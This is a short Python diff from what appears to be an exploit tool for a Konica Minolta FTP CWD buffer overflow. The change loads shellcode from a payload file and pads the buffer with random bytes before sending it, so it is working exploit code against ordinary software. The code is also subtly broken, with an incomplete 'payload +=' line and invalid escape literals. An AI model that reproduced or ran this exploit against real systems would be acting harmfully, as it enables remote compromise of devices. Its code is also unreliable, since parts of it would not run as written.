@@ -82,8 +82,11 @@ class konicaMinoltaCwdOverflowMenu(cmd.Cmd):
     for a in range(0, 2):
       payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
     payload += 
-    exec(open("../../../payloads/konica_minolta_cwd.shell", "r").read())
-    for a in range(0, 1037):
+    f = open("../../../payloads/konica_minolta_cwd.shell", "r")
+    for line in f.readlines():
+      payload += line[:-1].decode('string_escape')
+    f.close()
+    for a in range(0, 3000):
       payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
     print "[+]Payload generated."
     print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
